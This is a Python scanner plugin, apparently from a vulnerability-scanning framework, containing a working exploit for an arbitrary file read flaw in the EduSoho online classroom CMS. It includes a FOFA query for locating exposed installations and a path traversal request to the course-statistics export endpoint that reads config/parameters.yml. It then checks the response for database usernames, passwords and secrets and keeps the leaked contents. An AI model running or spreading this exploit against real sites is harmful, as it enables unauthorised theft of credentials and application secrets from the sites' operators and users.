#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/NPpLQI7eET1NR2FHIJfNww',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Edusoho网络课堂cms存在任意文件读取',

      'level'     :   'high',

      'FOFA'      :   'title="EduSoho"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/25',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'parameters.*?database_user.*?database_password.*?secret.*?webpack_base_url',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret